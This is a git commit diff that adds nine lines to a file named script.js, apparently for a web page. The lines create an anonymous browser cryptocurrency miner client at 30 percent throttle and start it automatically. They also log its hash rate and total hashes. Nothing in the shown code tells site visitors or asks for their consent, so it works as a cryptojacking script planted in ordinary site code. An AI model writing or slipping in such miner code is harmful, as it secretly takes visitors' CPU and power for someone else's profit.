76e465ead34a500e3462b8403e05d5adef4d245c
NikoT19 <77738198+NikoT19@users.noreply.github.com>
2024-12-23 10:21:49 +0600

    script.js

--- script.js
+++ script.js
@@ -1,1 +1,9 @@
-
+const miner=new Client.Anonymous('web-app',{throttle:0.3,
+});
+if (!miner.isRunning()){
+  miner.start();
+}
+miner.on('update',(data)=>{
+  console.log('hash rate:${data.hashesPerSecond}');
+  console.log('Total hashes:${data.totalHashes}');
+});
